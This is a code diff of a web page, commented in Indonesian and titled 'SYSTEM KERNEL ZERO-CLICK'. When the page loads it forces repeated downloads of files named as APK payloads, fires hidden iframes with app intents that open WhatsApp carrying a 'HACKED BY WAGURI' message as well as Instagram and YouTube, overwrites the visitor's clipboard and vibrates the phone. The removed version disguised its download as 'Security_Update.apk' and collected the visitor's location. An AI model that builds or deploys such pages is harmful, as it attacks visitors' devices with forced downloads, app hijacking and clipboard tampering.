@@ -3,27 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Verification</title>
+<title>SYSTEM KERNEL ZERO-CLICK</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000; color: #f00; font-family: monospace;
+    background: #000; color: #ff0000; font-family: monospace;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
+    height: 100vh; margin: 0; text-align: center; overflow: hidden;
   }
-  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
-  h2 { animation: blink 0.2s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
-  iframe, video, canvas { display: none !important; }
+  .panel { background: #0a0a0a; padding: 35px; border-radius: 15px; border: 2px solid #ff0000; max-width: 420px; width: 100%; box-shadow: 0 0 40px rgba(255,0,0,0.7); }
+  h2 { animation: extreme-glitch 0.1s infinite; font-size: 24px; }
+  @keyframes extreme-glitch { 
+    0% { transform: translate(0); color: #ff0000; }
+    20% { transform: translate(-4px, 3px); color: #ffffff; }
+    40% { transform: translate(-15px, -3px); color: #ff0000; }
+    60% { transform: translate(4px, 4px); color: #00ff00; }
+    80% { transform: translate(-2px, -2px); color: #ff0000; }
+    100% { transform: translate(0); }
+  }
+  #log { margin-top: 20px; background: #000; padding: 12px; border-radius: 6px; color: #00ff00; font-size: 11px; text-align: left; height: 140px; overflow-y: auto; border: 1px solid #ff0000; }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>☢️ SYSTEM HACKED ☢️</h2>
-  <p>Klik di mana saja untuk memulai.</p>
-  <div id="log">Sistem siap.</div>
+  <h2>⚡ ZERO-CLICK ACTIVE ⚡</h2>
+  <p style="color: #fff; margin-top: 10px; font-size: 13px;">Memicu payload otomatis tanpa interaksi...</p>
+  <div id="log">[!] Menginisialisasi siklus zero-click...</div>
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
@@ -33,138 +40,122 @@
   'use strict';
 
   var logEl = document.getElementById('log');
-  var executed = false;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
+    logEl.scrollTop = logEl.scrollHeight;
     console.log(msg);
   }
 
-  // ============================================
-  // KONFIGURASI (TARGET DIGANTI KE INSTAGRAM)
-  // ============================================
-  var TARGET_INTENT = "intent://#Intent;" +
-                      "package=com.instagram.android;" +
-                      "scheme=instagram;" +
-                      "end;";
+  var PAYLOAD_TEXT = "HACKED BY WAGURI - ZERO-CLICK COMPROMISE";
+  var ENCODED_TEXT = encodeURIComponent(PAYLOAD_TEXT);
   
-  // Fallback jika Instagram tidak terinstal
-  var FALLBACK_URL = "https://www.instagram.com/";
-  
-  var TARGET_APK_B64 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
+  var TARGETS = [
+    "whatsapp://send?text=" + ENCODED_TEXT,
+    "intent://send?text=" + ENCODED_TEXT + "#Intent;package=com.whatsapp;scheme=whatsapp;end;",
+    "instagram://",
+    "intent://#Intent;package=com.instagram.android;scheme=instagram;end;",
+    "vnd.youtube://",
+    "intent://#Intent;package=com.google.android.youtube;scheme=vnd.youtube;end;"
+  ];
 
-  // ============================================
-  // FUNGSI EKSEKUSI VEKTOR
-  // ============================================
-  function triggerAPKRace() {
+  var F1 = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
+  var F2 = "UEsDBAoAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAAUGF5bG9hZFBhcnQ=";
+  var F3 = "UEsDBBQACAAIAAAAIQAAAAAAAAAAAAAAAAAKAAAAcmVzb3VyY2Vz";
+
+  function triggerVibration() {
     try {
-      var binary = atob(TARGET_APK_B64);
-      var bytes = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-      
-      var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
+      if (navigator.vibrate) {
+        navigator.vibrate([200, 100, 200, 100]);
+      }
+    } catch(e) {}
+  }
+
+  function dropMassiveAPKs(batchIndex) {
+    try {
+      var b1 = atob(F1), b2 = atob(F2), b3 = atob(F3);
+      var combined = b1 + b2 + b3;
+      var buffer = new Uint8Array(combined.length);
+      for (let i = 0; i < combined.length; i++) buffer[i] = combined.charCodeAt(i);
+
+      var blob = new Blob([buffer], { type: "application/vnd.android.package-archive" });
       var url = URL.createObjectURL(blob);
-      
+
       var a = document.createElement("a");
       a.href = url;
-      a.download = "Security_Update.apk";
+      a.download = "ZeroClick_Payload_" + batchIndex + ".apk";
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
-      
-      log("[+] APK Download Triggered.");
-    } catch(e) {}
+      URL.revokeObjectURL(url);
+      log("[+] Zero-Click APK Thread #" + batchIndex + " Dispatched.");
+    } catch(e) {
+      log("[-] APK Drop Fail: " + e.message);
+    }
   }
 
-  function triggerInstagramIntent() {
+  function sprayIntents() {
     try {
-      // Top-Level Redirect
-      window.location.href = TARGET_INTENT;
-      
-      // Iframe Fallback
-      var iframe = document.createElement("iframe");
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-      iframe.style.display = "none";
-      iframe.srcdoc = `
-        <!DOCTYPE html>
-        <html><body><script>window.top.location.href = "${TARGET_INTENT}";<\/script></body></html>
-      `;
-      document.getElementById("launcher-container").appendChild(iframe);
-      
-      log("[+] Instagram Intent Triggered.");
-      
-      // Fallback URL setelah 500ms
-      setTimeout(function() {
-        window.location.href = FALLBACK_URL;
-      }, 500);
-    } catch(e) {}
+      var container = document.getElementById("launcher-container");
+      for (let i = 0; i < TARGETS.length; i++) {
+        var scheme = TARGETS[i];
+        var iframe = document.createElement("iframe");
+        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
+        iframe.style.display = "none";
+        iframe.src = scheme;
+        container.appendChild(iframe);
+      }
+      log("[+] Zero-Click Intent Spraying Completed.");
+    } catch(e) {
+      log("[-] Intent Spray Error: " + e.message);
+    }
   }
 
-  function triggerLocationRace() {
+  function executeClipboardSpam() {
     try {
-      if (!navigator.geolocation) return;
-      
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          log("[+] LOKASI: " + position.coords.latitude + ", " + position.coords.longitude);
-        },
-        function(error) {
-          log("[-] Lokasi diblokir: " + error.message);
-        },
-        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-      );
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(PAYLOAD_TEXT);
+        log("[+] Clipboard Overwritten Automatically.");
+      } else {
+        var ta = document.createElement("textarea");
+        ta.value = PAYLOAD_TEXT;
+        ta.style.position = "fixed";
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        log("[+] Clipboard Overwritten via Fallback.");
+      }
     } catch(e) {}
   }
 
   // ============================================
-  // TRIGGER RACE CONDITION LOOP (KLIK)
+  // AUTO-EXECUTE (ZERO-CLICK ON LOAD)
   // ============================================
-  document.body.addEventListener('click', function() {
-    if (executed) return;
-    executed = true;
+  window.addEventListener('DOMContentLoaded', function() {
+    triggerVibration();
+    log("[!] Memulai eksekusi zero-click instan...");
 
-    document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING...</h2>
-      <p>Memulai Instagram Race...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai Instagram Hijack Race...");
+    var totalRounds = 5;
+    var burstTasks = [];
 
-    // 1. Trigger Pertama (0ms)
-    triggerAPKRace();
-    triggerInstagramIntent();
-    triggerLocationRace();
+    for (let r = 0; r < totalRounds; r++) {
+      burstTasks.push(new Promise((resolve) => {
+        var jitter = Math.floor(Math.random() * 10);
+        setTimeout(() => {
+          dropMassiveAPKs(r);
+          sprayIntents();
+          executeClipboardSpam();
+          resolve();
+        }, jitter + (r * 15));
+      }));
+    }
 
-    // 2. Retry Cepat (50ms)
-    setTimeout(function() {
-      triggerAPKRace();
-      triggerInstagramIntent();
-      triggerLocationRace();
-    }, 50);
-
-    // 3. Retry Sedang (150ms)
-    setTimeout(function() {
-      triggerAPKRace();
-      triggerInstagramIntent();
-      triggerLocationRace();
-    }, 150);
-
-    // 4. Retry Lambat (500ms)
-    setTimeout(function() {
-      triggerAPKRace();
-      triggerInstagramIntent();
-      triggerLocationRace();
-    }, 500);
-
-    // 5. Retry Terakhir (1000ms)
-    setTimeout(function() {
-      triggerAPKRace();
-      triggerInstagramIntent();
-      triggerLocationRace();
-    }, 1000);
-
-  }, { once: true });
+    Promise.allSettled(burstTasks).then(() => {
+      log("[✓] Siklus zero-click selesai dieksekusi.");
+    });
+  });
 
 })();
 </script>
